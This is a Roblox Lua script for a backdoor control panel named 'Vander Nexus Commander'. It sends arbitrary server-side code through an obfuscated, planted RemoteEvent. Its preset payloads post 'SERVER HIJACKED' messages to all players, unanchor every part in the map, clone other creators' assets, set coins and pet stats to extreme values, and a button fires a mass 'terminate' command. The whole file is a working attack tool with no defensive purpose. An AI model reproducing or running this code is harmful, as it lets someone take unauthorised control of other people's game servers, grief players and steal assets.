-- [[ VANDER NEXUS: COMMANDER v2.0 UNTETHERED ]]
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

local REMOTE_NAME = "v\97n\100e\114_n\101x\117s"

local Theme = {
    Background = Color3.fromRGB(5, 5, 7),
    Accent = Color3.fromRGB(255, 0, 100), -- VANDER PINK
    Text = Color3.fromRGB(240, 240, 240),
    Success = Color3.fromRGB(0, 255, 120),
    Error = Color3.fromRGB(255, 50, 50)
}

local screen = Instance.new("ScreenGui")
screen.Name = "VanderNexus_V2"
pcall(function() screen.Parent = game:GetService("CoreGui") end)

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 500, 0, 350)
main.Position = UDim2.new(0.5, -250, 0.5, -175)
main.BackgroundColor3 = Theme.Background
main.Parent = screen
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
Instance.new("UIStroke", main).Color = Theme.Accent

local title = Instance.new("TextLabel")
title.Text = "VANDER NEXUS | COMMANDER [V2]"
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundTransparency = 1
title.TextColor3 = Theme.Accent
title.Font = Enum.Font.GothamBlack
title.TextSize = 20
title.Parent = main

local codeBox = Instance.new("TextBox")
codeBox.Size = UDim2.new(0, 300, 0, 180)
codeBox.Position = UDim2.new(0, 20, 0, 60)
codeBox.BackgroundColor3 = Color3.fromRGB(12, 12, 15)
codeBox.TextColor3 = Theme.Text
codeBox.Text = ""
codeBox.PlaceholderText = "-- SERVER-SIDE LUA HERE"
codeBox.Font = Enum.Font.Code
codeBox.TextSize = 12
codeBox.TextXAlignment = Enum.TextXAlignment.Left
codeBox.TextYAlignment = Enum.TextYAlignment.Top
codeBox.Parent = main
Instance.new("UICorner", codeBox)

-- PRESETS PANEL
local side = Instance.new("Frame")
side.Size = UDim2.new(0, 150, 0, 180)
side.Position = UDim2.new(0, 330, 0, 60)
side.BackgroundTransparency = 1
side.Parent = main

local btnList = Instance.new("UIListLayout", side)
btnList.Padding = UDim.new(0, 5)

local function quickBtn(txt, callback)
    local b = Instance.new("TextButton")
    b.Text = txt
    b.Size = UDim2.new(1, 0, 0, 30)
    b.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    b.TextColor3 = Theme.Text
    b.Font = Enum.Font.GothamMedium
    b.TextSize = 12
    b.Parent = side
    Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(callback)
end

quickBtn("GLOBAL SHOUT", function()
    codeBox.Text = [[
        for _, p in pairs(game.Players:GetPlayers()) do
            game:GetService("TextChatService").TextChannels.RBXGeneral:DisplaySystemMessage("<font color='#ff0000'>[VANDER]: SERVER HIJACKED BY YPIBS</font>")
        end
    ]]
end)

quickBtn("SPAWN SKIBIDI", function()
    codeBox.Text = [[
        local id = 11488128362 -- Skibidi Asset ID
        local m = game:GetService("InsertService"):LoadAsset(id)
        m.Parent = workspace
        m:MoveTo(game.Players.ypibs.Character.HumanoidRootPart.Position + Vector3.new(0,5,0))
    ]]
end)

quickBtn("FORCE UNANCHOR", function()
    codeBox.Text = [[
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("Part") then v.Anchored = false end
        end
    ]]
end)

quickBtn("STEAL TARGET", function()
    codeBox.Text = [[
        -- Focus your mouse on a brainrot or object first
        local target = game.Players.ypibs:GetMouse().Target
        if target then
            print("--- VANDER ASSET RIP ---")
            print("Name: " .. target.Name)
            if target:IsA("MeshPart") then print("MeshID: " .. target.MeshId) end
            if target:FindFirstChildOfClass("SpecialMesh") then print("SpecialID: " .. target:FindFirstChildOfClass("SpecialMesh").MeshId) end
            
            -- Clone to stash
            local c = target:Clone()
            c.Parent = game.Players.ypibs.Character
            c.Position = game.Players.ypibs.Character.HumanoidRootPart.Position
        end
    ]]
end)

quickBtn("MAX GARDEN", function()
    codeBox.Text = [[
        -- Grow a Garden Server-Side Wipe
        local p = game.Players.ypibs
        if p:FindFirstChild("leaderstats") then
            if p.leaderstats:FindFirstChild("Coins") then p.leaderstats.Coins.Value = 999999999 end
        end
        -- Auto-Grow Plants
        for _, v in pairs(workspace:GetDescendants()) do
            if v.Name == "Stage" or v.Name == "Growth" then v.Value = 100 end
        end
    ]]
end)

quickBtn("PET GOD MODE", function()
    codeBox.Text = [[
        -- Search for Pets and Force Mutations
        local pFolder = game.Players.ypibs:FindFirstChild("Pets") or workspace:FindFirstChild("Pets")
        if pFolder then
            for _, b in pairs(pFolder:GetDescendants()) do
                if b.Name == "Mutation" or b.Name == "Level" then b.Value = 999 end
            end
        end
    ]]
end)

quickBtn("GLOBAL CHAT", function()
    codeBox.Text = [[
        local message = "VANDER NEXUS IS HERE" -- Change this message
        for _, p in pairs(game.Players:GetPlayers()) do
            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(message)
        end
    ]]
end)

-- LOWER ACTIONS
local exec = Instance.new("TextButton")
exec.Text = "EXECUTE SIGNAL"
exec.Size = UDim2.new(0, 225, 0, 45)
exec.Position = UDim2.new(0, 20, 0, 260)
exec.BackgroundColor3 = Theme.Accent
exec.TextColor3 = Color3.new(1,1,1)
exec.Font = Enum.Font.GothamBold
exec.Parent = main
Instance.new("UICorner", exec)

local kill = Instance.new("TextButton")
kill.Text = "MASS TERMINATE"
kill.Size = UDim2.new(0, 225, 0, 45)
kill.Position = UDim2.new(0, 255, 0, 260)
kill.BackgroundColor3 = Theme.Error
kill.TextColor3 = Color3.new(1,1,1)
kill.Font = Enum.Font.GothamBold
kill.Parent = main
Instance.new("UICorner", kill)

-- LOGIC
exec.MouseButton1Click:Connect(function()
    local r = ReplicatedStorage:FindFirstChild(REMOTE_NAME)
    if r then
        print("[NEXUS] Signal Fired to: " .. r.Name)
        r:FireServer("\101x\101", codeBox.Text)
        exec.BackgroundColor3 = Theme.Success
        exec.Text = "SIGNAL SENT!"
        task.delay(1, function() exec.BackgroundColor3 = Theme.Accent; exec.Text = "EXECUTE SIGNAL" end)
    else
        warn("[NEXUS] CRITICAL ERROR: NO BACKDOOR FOUND IN THIS SERVER")
        exec.BackgroundColor3 = Theme.Error
        exec.Text = "UPLINK FAILED (404)"
        task.delay(1, function() exec.BackgroundColor3 = Theme.Accent; exec.Text = "EXECUTE SIGNAL" end)
    end
end)

kill.MouseButton1Click:Connect(function()
    local r = ReplicatedStorage:FindFirstChild(REMOTE_NAME)
    if r then r:FireServer("\107\105\108") end
end)

-- Drag
local dragging, dragStart, startPos
main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
end)

print("Vander Nexus Commander V2 Loaded.")
